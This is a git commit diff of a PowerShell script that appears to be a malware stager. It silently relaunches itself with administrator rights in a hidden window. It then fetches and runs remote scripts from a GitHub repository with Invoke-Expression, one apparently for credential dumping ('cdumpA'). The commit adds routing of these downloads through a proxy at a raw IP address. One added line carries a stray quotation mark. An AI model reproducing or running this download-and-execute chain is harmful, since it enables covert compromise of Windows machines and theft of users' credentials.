85ec3a97f8b2db9a13f76f8ba3efbe7ef159d03c
tameval <114147355+tameval@users.noreply.github.com>
2022-10-22 17:55:59 +0900

    Update init_124509.ps1

--- 124509/proxy/init_124509.ps1
+++ 124509/proxy/init_124509.ps1
@@ -1,10 +1,12 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 
+$proxy_url = 'http://13.231.199.128:3128'; $web_client = New-Object System.Net.WebClient; $proxy_server = New-Object System.Net.WebProxy($proxy_url, $true); $web_client.Proxy = $proxy_server
+
 #7zip
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509.ps1')
 
 #scanning
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509.ps1')"
+IEX $web_client.DownloadString('https://raw.githubusercontent.com/tameval/script/main/scan_124509.ps1')"
 
 #cdumpA
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509.ps1')"
